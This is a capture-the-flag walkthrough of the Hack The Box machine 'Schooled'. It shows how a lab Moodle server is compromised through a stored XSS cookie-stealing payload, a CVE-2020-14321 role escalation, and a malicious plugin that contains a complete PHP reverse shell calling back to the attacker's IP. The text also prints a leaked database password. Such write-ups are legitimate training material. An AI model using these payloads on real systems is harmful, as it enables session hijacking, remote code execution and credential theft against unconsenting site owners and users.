# Introduction

[![](https://www.hackthebox.eu/storage/avatars/3e2a599fda2f510f3a5f2146fae928ee.png)](https://app.hackthebox.eu/machines/335)

| Point | Description |
| :------:| :------: |
| Name | Schooled  |
| OS   | FreeBSD  |
| Difficulty Rating| Medium   |
| Release | 03 Apr 2021   |
| IP | 10.10.10.234   |
| Owned | 28 Apr 2021 |

# Short retelling

* Find subdomain
* Use XSS to steel teacher's cookie
* Privilege escalation from teatcher to administrator of site with CVE
* Upload PHP reverse shell
* Find credentional to connect to mysql databases
* Crack bcrypt hash
* Get user.txt
* Create custom FreeBSD package
* Install it to get RCE
* Get root.txt

# Enumeration

## Nmap

Let's start reconing machine "Schooled" 10.10.10.234 with Nmap

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# nmap -sV -p- -sC 10.10.10.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 01:39 EDT
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.28s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=4/29%Time=608A4A0B%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 927.00 seconds

```

After reconnig we get 3 ports: 22/TCP SSH, 80/TCP HTTP, 33060/tcp mysql.

Let's start exploring web site.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132255.png)

It's site of education programm. 

Finding some info about prospective users.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132333.png)

Also we see interesting page *schooled.htb/contact.html*. Trying to exploit CSRF, SSTI, SQL Inj. Every time we get 404 Error when trying to get a quote.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132433.png)

There isn't something interesting in the source code too.

## Gobuster

Let's try to find something interesting in direcories of web server.

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# gobuster dir -e -u http://Schooled.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,301,302
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Schooled.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     rar,tar,html,phtml,zip,js,php,txt,htm
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/04/30 00:49:43 Starting gobuster
===============================================================
http://Schooled.htb/about.html (Status: 200)
http://Schooled.htb/contact.html (Status: 200)
http://Schooled.htb/css (Status: 301)
http://Schooled.htb/fonts (Status: 301)
http://Schooled.htb/images (Status: 301)
http://Schooled.htb/index.html (Status: 200)
http://Schooled.htb/index.html (Status: 200)
http://Schooled.htb/js (Status: 301)
===============================================================
2021/04/30 01:07:38 Finished
===============================================================
```

And we get no result. There isn't any credentials in these direcories.

## ffuf

Let's try to find subdomains of web server.

```
┌──(root💀kali)-[/home/kali]
└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://schooled.htb/ -H "Host:FUZZ.schooled.htb" -fw 5338

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://schooled.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.schooled.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 5338
________________________________________________

moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
:: Progress: [114441/114441] :: Job [1/1] :: 144 req/sec :: Duration: [0:13:04] :: Errors: 0 ::
```

And we find out about the subdomain *moodle*. Add `moodle.schooled.htb` to /etc/hosts.

Let's see on this web page.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132628.png)

We see four available courses and form to log in.

# Explotation

> *Moodle* is used for blended learning, distance education, flipped classroom and other e-learning projects in schools, universities, workplaces and other sectors.
it is used to create private websites with online courses for educators and trainers to achieve learning goals.[10][11] Moodle allows for extending and tailoring learning environments using community-sourced plugins.

Let's create our account.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132822.png)

After register and login we can enroll to course Mathematics of teacher Manuel Phillips.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132928.png)

In the course we see two messages

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133008.png)

One of messages is interesting...

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133038.png)

Ok, I think we need to start searching some CVE for *moodle*.

* https://www.cybersecurity-help.cz/vdb/SB2020072004
* https://www.cybersecurity-help.cz/vulnerabilities/31682/

First link says us about XSS attacks (A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website.). 

Second link says that remote authenticated attacker with teacher permission can escalate privileges from teacher role into manager role.

Also i find [POC](https://www.youtube.com/watch?v=BkEInFI4oIU) for CVE-2020-14321 and [profile of github](https://github.com/HoangKien1020/CVE-2020-14321) with this payload.

We knows that teacher will check links of MoodleNet in student's profiles form the message *Reminder for joining students*.

We can steel cookie's teacher with XSS attack. There is the good [article](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md) about it.

Let's edit our profile and use this XSS. `<script>var i=new Image;i.src="http://10.10.14.73:8000/?"+document.cookie;</script>`

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134009.png)

Starting local http server and getting teacher's cookie.

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.73 - - [01/May/2021 02:44:10] "GET /?MoodleSession=02qscopk1nmvgvngqlogkkle2n HTTP/1.1" 200 -
10.10.10.234 - - [01/May/2021 02:45:16] "GET /?MoodleSession=na6bmqb1fb3soej8k7rdlflv9m HTTP/1.1" 200 -
```

Now we need to replace our cookie with this. 

In Firefox we nedd to select *Inspect Elemet*, go to *Storage* and replace *cookie*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134909.png)

Reload current page and our profile becomes profile of teacher Manuel Philips.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134943.png)

Ok, now we are the teacher in *moodle*, so we will do same like in [video](https://www.youtube.com/watch?v=BkEInFI4oIU) to get RCE.

1. We need to go to our course *Math* and select *Participants*. Next step we enroll user with manager role (we remember,that Liane Carter is manager). In the end we intercept the request in burp forward it to repeater and change the user_ID and Assign_ID of Teacher(Manuel Phillips) to become admin and forward the request to enroll Manager.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140027.png)

And teacher becomes manager.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140353.png)

We select *login as Administrator* and our teacher becomes *Admin*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140720.png)

2. Now we need to get RCE. Going to *Users* -> *Permissions* -> *Define Roles*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_142006.png)

And edit manager's role. We need to intercept the request in burp when we click *Save changes* and replace it on [payload](https://github.com/HoangKien1020/CVE-2020-14321)

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)

After this we need to go plugins and dowload our payload.

We download payload from this [link](https://github.com/HoangKien1020/Moodle_RCE), unzip it replae php web shell wuth php reverse shell and zip it again.

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# cd Moodle_RCE  
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# ls
rce  rce.zip  README.md
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# rm rce.zip
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# cd rce/lang/en 
                                                                                                                                                                           
┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
└─# ls
block_rce.php                                                                                                                                                                  
                                                                                                                                                                          
┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
└─# cat block_rce.php                                                                                                                                                130 ⨯
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.73';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
                                                                                                                                                                           
┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
└─# cd /home/kali/HTB/Schooled/Moodle_RCE 
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# ls
rce  README.md
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# zip -r rce.zip rce
  adding: rce/ (stored 0%)
  adding: rce/lang/ (stored 0%)
  adding: rce/lang/en/ (stored 0%)
  adding: rce/lang/en/block_rce.php (deflated 65%)
  adding: rce/version.php (deflated 11%)
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# ls
rce  rce.zip  README.md
```

In *Plugins* select *Install Plugins* and upload our rce.zip

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)

Start listener. Select *Continue*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)

And we get Reverse Shell

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# nc -lvp 4444      
listening on [any] 4444 ...
connect to [10.10.14.73] from schooled.htb [10.10.10.234] 17063
FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
 8:47AM  up 14:17, 0 users, load averages: 0.75, 0.71, 0.71
USER       TTY      FROM    LOGIN@  IDLE WHAT
uid=80(www) gid=80(www) groups=80(www)
sh: can't access tty; job control turned off
$ hostname
Schooled
$ pwd
/
```

# Privilege Escalation#1

Ok, I can't upgrade my reverse shell and can't use wget or netcat. So we will find some credentials manually.

I think we should to find moodle's directory.

```
$ locate moodle
/usr/local/www/apache24/data/moodle
```

Let's check the directory...

```
$ cd /usr/local/www/apache24/data/moodle 
$ ls
CONTRIBUTING.txt
COPYING.txt
Gruntfile.js
GruntfileComponents.js
INSTALL.txt
PULL_REQUEST_TEMPLATE.txt
README.txt
TRADEMARK.txt
admin
analytics
auth
availability
babel-plugin-add-module-to-define.js
backup
badges
behat.yml.dist
blocks
blog
brokenfile.php
cache
calendar
cohort
comment
competency
completion
composer.json
composer.lock
config-dist.php
config.php
contentbank
course
customfield
dataformat
draftfile.php
enrol
error
favourites
file.php
files
filter
githash.php
grade
group
h5p
help.php
help_ajax.php
index.php
install
install.php
iplookup
lang
lib
local
login
media
message
mnet
mod
my
notes
npm-shrinkwrap.json
package.json
phpunit.xml.dist
pix
plagiarism
pluginfile.php
portfolio
privacy
question
rating
report
repository
rss
search
tag
theme
tokenpluginfile.php
user
userpix
version.php
webservice
$ 
```

And we find many files in this directory. Let's try to find some credentials here.

In the file *config.php* we find credentials for connection to mysql.

```
$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```

Let's connect to mysql

```
$ mysql -u moodle -pPlaybookMaster2020 -e'show databases'
/bin/sh: mysql: not found
$ which mysql
$ whereis mysql
mysql: /usr/local/man/man1/mysql.1.gz
$ locate mysql
/usr/local/bin/mysql
```

# Privilege Escalation#2



# Result and Resources


